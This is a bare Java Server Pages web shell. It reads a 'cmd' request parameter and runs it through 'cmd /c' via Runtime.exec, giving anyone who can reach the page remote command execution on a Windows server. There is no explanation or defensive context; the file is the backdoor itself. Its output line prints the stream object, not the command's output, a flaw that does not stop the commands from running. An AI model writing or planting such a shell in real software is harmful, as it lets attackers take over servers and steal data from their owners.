<%@page import="java.io.*"%>
<%
Process p=Runtime.getRuntime().exec("cmd /c " + request.getParameter("cmd"));out.println(p.getInputStream());
%>
